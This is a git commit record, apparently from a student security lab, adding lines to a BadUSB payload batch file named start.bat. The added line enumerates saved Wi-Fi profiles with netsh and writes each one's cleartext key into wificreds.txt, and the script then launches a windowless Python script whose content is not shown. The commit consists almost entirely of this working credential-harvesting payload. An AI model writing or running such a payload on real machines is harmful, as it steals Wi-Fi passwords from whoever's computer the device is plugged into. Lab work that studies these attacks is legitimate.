2344f4c4b25a2dccac269d8ca81800bcfe3c92e3
Emile Villette <emile.villette@student.uclouvain.be>
2024-09-21 00:11:57 -0400

    wifi creds
    Signed-off-by: Emile Villette <emile.villette@student.uclouvain.be>

--- tp1/usb-payload/bad_usb/payload/start.bat
+++ tp1/usb-payload/bad_usb/payload/start.bat
@@ -1,2 +1,5 @@
 @echo off
+for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear >> wificreds.txt
+
 python try4.pyw
+
